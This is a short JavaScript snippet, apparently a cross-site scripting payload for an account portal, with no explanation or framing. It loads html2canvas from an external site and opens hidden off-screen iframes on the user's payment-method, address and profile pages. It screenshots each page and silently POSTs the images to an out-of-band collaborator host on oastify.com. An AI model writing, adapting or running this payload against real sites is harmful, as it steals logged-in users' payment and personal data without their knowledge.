(async () => {
  const exfil = "https://sc8x6e61qbs6lify3ui82ammjdp4dv7jw.oastify.comscreenshot";
  const paths = [
    "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
    "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
    "/user/userinfo/"
  ];

  const script = document.createElement('script');
  script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
  script.onload = async () => {
    for (const path of paths) {
      try {
        const iframe = document.createElement("iframe");
        iframe.style = "width:1000px;height:1000px;position:absolute;top:-2000px;";
        iframe.src = path;
        document.body.appendChild(iframe);

        await new Promise(r => setTimeout(r, 3000)); // wait for iframe to load

        const canvas = await html2canvas(iframe.contentDocument.body);
        const img = canvas.toDataURL("image/png");

        await fetch(exfil, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: location.origin + path, image: img })
        });

        document.body.removeChild(iframe);
      } catch (e) {}
    }
  };
  document.body.appendChild(script);
})();
